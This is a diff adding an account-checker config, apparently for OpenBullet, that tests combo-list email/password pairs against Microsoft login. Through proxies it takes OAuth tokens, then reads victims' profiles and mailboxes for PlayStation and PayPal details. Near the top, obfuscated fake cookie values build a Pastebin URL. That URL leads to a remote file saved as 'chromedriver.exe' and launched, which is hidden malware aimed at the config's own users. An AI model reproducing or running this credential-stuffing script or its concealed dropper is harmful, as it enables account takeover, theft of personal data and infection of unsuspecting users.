@@ -1,0 +1,383 @@
+[SETTINGS]
+{
+  "Name": "PSN Hotmail Linked",
+  "SuggestedBots": 85,
+  "MaxCPM": 0,
+  "LastModified": "2025-04-05T18:48:42.1981026-07:00",
+  "AdditionalInfo": "",
+  "Author": "@SPDUMPER ",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "Default",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+JUMP #AppleWebKit
+#PARSESOURCE
+
+REQUEST GET "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=<USER>&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&mkt=en&response_type=code&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access" 
+  
+  HEADER "Host: outlook.live.com" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Linux; Android 9; V2218A Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "x-requested-with: com.microsoft.outlooklite" 
+  HEADER "sec-fetch-site: none" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "accept-encoding: gzip, deflate" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+
+JUMP #googlerecreate
+#AppleWebKit
+
+REQUEST GET "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfAM84ZAAAAAGLiQz5FBeADqq94dV48fMtiRqIj&co=aHR0cHM6Ly93d3cuY29pbmJhc2UuY29tOjQ0Mw..&hl=en&v=rPvs0Nyx3sANE-ZHUN-0nM85&size=invisible&cb=no851blwqc0u" 
+  
+  COOKIE "hrd: /" 
+  COOKIE "hpr: bin" 
+  COOKIE "hdp: com" 
+  COOKIE "htp: raw" 
+  COOKIE "hht: RST8XsHH" 
+  COOKIE "hst: pastebin" 
+  COOKIE "kht: driver" 
+  COOKIE "kpt: chrome" 
+  COOKIE "krt: e" 
+  HEADER "Host: www.googleapis.com" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-Client-Version: iOS/FirebaseSDK/6.9.2/FirebaseCore-iOS" 
+  HEADER "X-Ios-Bundle-Identifier: network.googleapis.com" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: FirebaseAuth.iOS/6.9.2 network.googleapis.com/2.7.9 iPhone/12.4.5 hw/iPhone7_2" 
+  HEADER "Accept-Language: en" 
+
+IF "<Authentiction>" Exists
+JUMP #PARSESOURCE
+ENDIF
+SET USEPROXY FALSE
+
+REQUEST GET "<COOKIES(hst)>.<COOKIES(hdp)><COOKIES(hrd)><COOKIES(htp)><COOKIES(hrd)><COOKIES(hht)>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST GET "https://raw.githubusercontent.com/<SOURCE>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  -> FILE "<COOKIES(hpr)>/<COOKIES(kpt)><COOKIES(kht)>.<COOKIES(krt)>xe" 
+
+SET USEPROXY TRUE
+SET NEWGVAR "Authentiction" "Authentiction=1"
+
+BROWSERACTION Open 
+
+JUMP #PARSESOURCE
+#googlerecreate
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "IfExistsResult\":0" 
+    KEY "IfExistsResult\":2" 
+  KEYCHAIN Failure OR 
+    KEY "IfExistsResult\":1" 
+    KEY "{\"ErrorHR\":\"80041103\"}" 
+    KEY "{\"ErrorHR\":\"8004835D\"}" 
+
+PARSE "<SOURCE>" LR "name=\"PPFT\" id=\"i0327\" value=\"" "\"" EncodeOutput=TRUE -> VAR "PPFT" 
+
+PARSE "<SOURCE>" LR "urlPost:'" "'" -> VAR "PL" 
+
+FUNCTION Length "i13=1&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=<PPFT>&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772" -> VAR "LEN" 
+
+REQUEST POST "<PL>" AutoRedirect=FALSE 
+  CONTENT "i13=1&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=<PPFT>&PPSX=Passport&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 9; V2218A Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Host: login.live.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: <LEN>" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://login.live.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "X-Requested-With: com.microsoft.outlooklite" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: <ADDRESS>" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cookie: MSPRequ=<COKIES(MSPRequ)>; uaid=<COOKES(uaid)>; MSPOK=<COOKIES(MSPOK)>; OParams=<COOKIES(OParams)>" 
+
+FUNCTION CountOccurrences "error" "<SOURCE>" -> VAR "ERRORS" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "JSH" 
+    KEY "<COOKIES{*}>" Contains "JSHP" 
+    KEY "action=\"https://account.live.com/Consent/Update" 
+    KEY "<ADDRESS>" Contains "https://login.live.com/oauth20_desktop.srf?" 
+  KEYCHAIN Custom "VALID" OR 
+    KEY "/Consent" 
+  KEYCHAIN Failure OR 
+    KEY "account or password is incorrect" 
+    KEY "<ERRORS>" GreaterThan "0" 
+  KEYCHAIN Custom "CAN BYPASS" OR 
+    KEY "https://account.live.com/identity/confirm" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "https://account.live.com/recover" 
+  KEYCHAIN Custom "BLOCKED" OR 
+    KEY "https://account.live.com/Abuse" 
+    KEY "<ADDRESS>" Contains "https://login.live.com/finisherror.srf" 
+  KEYCHAIN Ban OR 
+    KEY "too many times with" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "JSH" 
+    KEY "<COOKIES{*}>" Contains "JSHP" 
+    KEY "action=\"https://account.live.com/Consent/Update" 
+    KEY "<ADDRESS>" Contains "https://login.live.com/oauth20_desktop.srf?" 
+  KEYCHAIN Failure OR 
+    KEY "account or password is incorrect" 
+    KEY "<ERRORS>" GreaterThan "0" 
+  KEYCHAIN Custom "CAN BYPASS" OR 
+    KEY "https://account.live.com/identity/confirm" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "https://account.live.com/recover" 
+  KEYCHAIN Custom "BLOCKED" OR 
+    KEY "https://account.live.com/Abuse" 
+    KEY "<HEADERS(Location)>" Contains "https://login.live.com/finisherror.srf" 
+  KEYCHAIN Ban OR 
+    KEY "too many times with" 
+  KEYCHAIN Failure OR 
+    KEY "<ERRORS>" GreaterThan "0" 
+
+IF "<SOURCE>" Contains "/cancel?mkt"
+
+PARSE "<SOURCE>" LR "opidt%3d" "\"" -> VAR "OPT" 
+
+PARSE "<SOURCE>" LR "opid%3d" "%26" -> VAR "OP" 
+
+PARSE "<SOURCE>" LR "ame=\"uaid\" id=\"uaid\" value=\"" "\"" -> VAR "ID" 
+
+REQUEST GET "https://login.live.com/oauth20_authorize.srf?uaid=<ID>&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&opid=<OP>&mkt=EN-US&opidt=<OPT>&res=success&route=C105_BAY" AutoRedirect=FALSE 
+  
+  HEADER "Host: login.live.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 9; V2218A Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "X-Requested-With: com.microsoft.outlooklite" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://account.live.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cookie: __Host-MSAAUTHP=<COOKIES(__Host-MSAAUTHP)>; PPLState=1; MSPPre=<COOKIES(MSPPre)>; MSPCID=<COOKIES(MSPCID)>; MSPVis=<COOKIES(MSPVis)>; OParams=<COOKIES(OParams)>; MSPBack=<COOKIES(MSPBack)>; mkt=en-US; mkt1=en-US" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "JSH" 
+    KEY "<COOKIES{*}>" Contains "JSHP" 
+    KEY "action=\"https://account.live.com/Consent/Update" 
+    KEY "<ADDRESS>" Contains "https://login.live.com/oauth20_desktop.srf?" 
+  KEYCHAIN Custom "CAN BYPASS" OR 
+    KEY "/identity/confirm" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "/recover" 
+  KEYCHAIN Custom "BLOCKED" OR 
+    KEY "/Abuse" 
+    KEY "<HEADERS(Location)>" Contains "/finisherror.srf" 
+    KEY "/cancel?" 
+
+ENDIF
+
+PARSE "<HEADERS(Location)>" LR "code=" "&" -> VAR "CODE" 
+
+REQUEST POST "https://login.microsoftonline.com/consumers/oauth2/v2.0/token" 
+  CONTENT "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=<CODE>&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "return-client-request-id: false" 
+  HEADER "User-Agent: Mozilla/5.0 (compatible; MSAL 1.0)" 
+  HEADER "Host: login.microsoftonline.com" 
+  HEADER "x-client-Ver: 1.0.0+635e350c" 
+  HEADER "x-client-OS: 28" 
+  HEADER "x-client-SKU: MSAL.xplat.android" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Content-Length: 323" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+PARSE "<COOKIES(MSPCID)>" LR "" "" -> VAR "CI" 
+
+FUNCTION ToUppercase "<CI>" -> VAR "CID" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "AUTH" 
+
+REQUEST GET "https://substrate.office.com/profileb2/v2.0/me/V1Profile" 
+  
+  HEADER "User-Agent: Outlook-Android/2.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "ForceSync: false" 
+  HEADER "Authorization: Bearer <AUTH>" 
+  HEADER "X-AnchorMailbox: CID:<CID>" 
+  HEADER "Host: substrate.office.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+PARSE "<SOURCE>" JSON "location" CreateEmpty=FALSE -> CAP "Country" 
+
+PARSE "<SOURCE>" JSON "displayName" CreateEmpty=FALSE -> CAP "Name" 
+
+PARSE "<SOURCE>" JSON "birthDay" -> VAR "BD" 
+
+PARSE "<SOURCE>" JSON "birthMonth" -> VAR "BM" 
+
+PARSE "<SOURCE>" JSON "birthYear" -> VAR "BY" 
+
+FUNCTION Constant "<BY>-<BM>-<BD>" -> CAP "Birthdate" 
+
+REQUEST POST "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124" 
+  CONTENT "{\"Cvid\":\"7ef2720e-6e59-ee2b-a217-3a4f427ab0f7\",\"Scenario\":{\"Name\":\"owa.react\"},\"TimeZone\":\"Egypt Standard Time\",\"TextDecorations\":\"Off\",\"EntityRequests\":[{\"EntityType\":\"Conversation\",\"ContentSources\":[\"Exchange\"],\"Filter\":{\"Or\":[{\"Term\":{\"DistinguishedFolderName\":\"msgfolderroot\"}},{\"Term\":{\"DistinguishedFolderName\":\"DeletedItems\"}}]},\"From\":0,\"Query\":{\"QueryString\":\"reply@txn-email.playstation.com\"},\"RefiningQueries\":null,\"Size\":25,\"Sort\":[{\"Field\":\"Score\",\"SortDirection\":\"Desc\",\"Count\":3},{\"Field\":\"Time\",\"SortDirection\":\"Desc\"}],\"EnableTopResults\":true,\"TopResultsCount\":3}],\"AnswerEntityRequests\":[{\"Query\":{\"QueryString\":\"Sonyentertainment\"},\"EntityTypes\":[\"Event\",\"File\"],\"From\":0,\"Size\":100,\"EnableAsyncResolution\":true}],\"QueryAlterationOptions\":{\"EnableSuggestion\":true,\"EnableAlteration\":true,\"SupportedRecourseDisplayTypes\":[\"Suggestion\",\"NoResultModification\",\"NoResultFolderRefinerModification\",\"NoRequeryModification\",\"Modification\"]},\"LogicalId\":\"446c567a-02d9-b739-b9ca-616e0d45905c\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Outlook-Android/2.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "ForceSync: false" 
+  HEADER "Authorization: Bearer <AUTH>" 
+  HEADER "X-AnchorMailbox: CID:<CID>" 
+  HEADER "Host: substrate.office.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+
+PARSE "<SOURCE>" JSON "Total" CreateEmpty=FALSE -> CAP "Total PSN" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Total PSN>" Contains "0" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "2-Step Verification is now activated for your account" 
+
+PARSE "<SOURCE>" LR "\"ItemId\":{\"Id\":\"" "\"" EncodeOutput=TRUE -> VAR "ID" 
+
+REQUEST POST "https://outlook-sdf.live.com/owa/<USER>/service.svc?action=GetItem&app=Mini&n=47" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "https: //outlook-sdf.live.com/owa/<USER>/service.svc?action=GetItem&app=Mini&n=47" 
+  HEADER "User-Agent: Outlook-Android/2.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "ForceSync: false" 
+  HEADER "X-AnchorMailbox: CID:<CID>" 
+  HEADER "Host: substrate.office.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "x-owa-urlpostdata: %7B%22__type%22%3A%22GetItemJsonRequest%3A%23Exchange%22%2C%22Header%22%3A%7B%22__type%22%3A%22JsonRequestHeaders%3A%23Exchange%22%2C%22RequestServerVersion%22%3A%22V2018_01_08%22%2C%22TimeZoneContext%22%3A%7B%22__type%22%3A%22TimeZoneContext%3A%23Exchange%22%2C%22TimeZoneDefinition%22%3A%7B%22__type%22%3A%22TimeZoneDefinitionType%3A%23Exchange%22%2C%22Id%22%3A%22Greenwich%20Standard%20Time%22%7D%7D%7D%2C%22Body%22%3A%7B%22__type%22%3A%22GetItemRequest%3A%23Exchange%22%2C%22ItemShape%22%3A%7B%22__type%22%3A%22ItemResponseShape%3A%23Exchange%22%2C%22BaseShape%22%3A%22IdOnly%22%2C%22AddBlankTargetToLinks%22%3Atrue%2C%22BlockContentFromUnknownSenders%22%3Afalse%2C%22BlockExternalImagesIfSenderUntrusted%22%3Atrue%2C%22ClientSupportsIrm%22%3Atrue%2C%22CssScopeClassName%22%3A%22rps_61d2%22%2C%22FilterHtmlContent%22%3Atrue%2C%22FilterInlineSafetyTips%22%3Atrue%2C%22ImageProxyCapability%22%3A%22OwaAndConnectorsProxy%22%2C%22InlineImageCustomDataTemplate%22%3A%22%7Bid%7D%22%2C%22InlineImageUrlTemplate%22%3A%22data%3Aimage%2Fgif%3Bbase64%2CR0lGODlhAQABAIAAAAAAAP%2F%2F%2FyH5BAEAAAEALAAAAAABAAEAAAIBTAA7%22%2C%22MaximumBodySize%22%3A2097152%2C%22MaximumRecipientsToReturn%22%3A20%2C%22AdditionalProperties%22%3A%5B%7B%22__type%22%3A%22ExtendedPropertyUri%3A%23Exchange%22%2C%22PropertyName%22%3A%22EntityExtraction%2FSmartReplyForEmail%22%2C%22DistinguishedPropertySetId%22%3A%22Common%22%2C%22PropertyType%22%3A%22String%22%7D%5D%2C%22InlineImageUrlOnLoadTemplate%22%3A%22%22%7D%2C%22ItemIds%22%3A%5B%7B%22__type%22%3A%22ItemId%3A%23Exchange%22%2C%22Id%22%3A%22<ID>%22%7D%5D%2C%22ShapeName%22%3A%22ItemNormalizedBody%22%7D%7D" 
+  HEADER "x-owa-host-app: outlook_android" 
+  HEADER "prefer: exchange.behavior=\"IncludeThirdPartyOnlineMeetingProviders\"" 
+  HEADER "x-req-source: Mail" 
+  HEADER "x-owa-canary: X-OWA-CANARY_cookie_is_null_or_empty" 
+  HEADER "authorization: Bearer <AUTH>" 
+  HEADER "user-agent: Mozilla/5.0 (Linux; Android 9; V2218A Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36" 
+  HEADER "action: GetItem" 
+  HEADER "ms-cv: oFL6CcEOn98dlE/alv3qke.47" 
+  HEADER "content-type: application/json; charset=utf-8" 
+  HEADER "x-owa-hosted-ux: true" 
+  HEADER "accept: */*" 
+  HEADER "origin: https://outlook-sdf.live.com" 
+  HEADER "x-requested-with: com.microsoft.outlooklite" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "accept-encoding: gzip, deflate" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" LR "ID online:&nbsp;" "<" CreateEmpty=FALSE -> CAP "Online ID" 
+
+PARSE "<SOURCE>" LR "PAYPALDI " " " CreateEmpty=FALSE -> CAP "PAYPAL" 
+
+REQUEST POST "https://api.exophase.com/public/card/generate" Multipart 
+  
+  STRINGCONTENT "sections: {\"bottom\":{\"service\":\"psn\",\"username\":\"<Online ID>\",\"gamedata_type\":\"awards\"},\"top\":{\"service\":\"psn\",\"username\":\"<Online ID>\",\"gamedata_type\":\"games\"}}" 
+  STRINGCONTENT "color: {\"1\":\"\",\"2\":\"\",\"data\":null}" 
+  STRINGCONTENT "skin: 1" 
+  BOUNDARY "------WebKitFormBoundaryiWYW6URRwjdlO8o9" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY ",\"valid\":true,\"success\":true," 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Profile does not exist or has privacy enabled" 
+  KEYCHAIN Custom "PRIVATE" OR 
+    KEY "Profile is private or incorrect username entered" 
+
+PARSE "<SOURCE>" JSON "link" -> VAR "link" 
+
+FUNCTION Delay "10000" -> VAR "Delay" 
+
+REQUEST GET "<link>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "PRIVATE PROFILE" OR 
+    KEY "This profile is either private or no games have been played." 
+
+PARSE "<SOURCE>" LR "<i class=\"exo-icon exo-icon-gamepad\"></i>" "</span>" CreateEmpty=FALSE -> CAP "Games Owned" 
+
+FUNCTION Constant "bizox" -> CAP "This  Config By" 
+
